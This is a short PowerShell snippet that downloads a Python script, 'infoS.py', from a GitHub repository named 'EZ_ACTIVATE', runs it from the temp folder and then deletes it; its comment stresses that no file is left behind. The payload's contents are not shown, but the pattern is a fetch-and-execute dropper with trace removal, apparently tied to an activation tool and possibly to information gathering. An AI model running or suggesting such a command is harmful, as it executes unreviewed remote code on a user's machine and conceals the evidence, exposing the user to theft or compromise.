# Download & run script (no file left behind)
$url = "https://raw.githubusercontent.com/QUADROisCoding/EZ_ACTIVATE/refs/heads/main/infoS.py"
$tempFile = "$env:TEMP\\infoS.py"
Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
python $tempFile
Remove-Item $tempFile
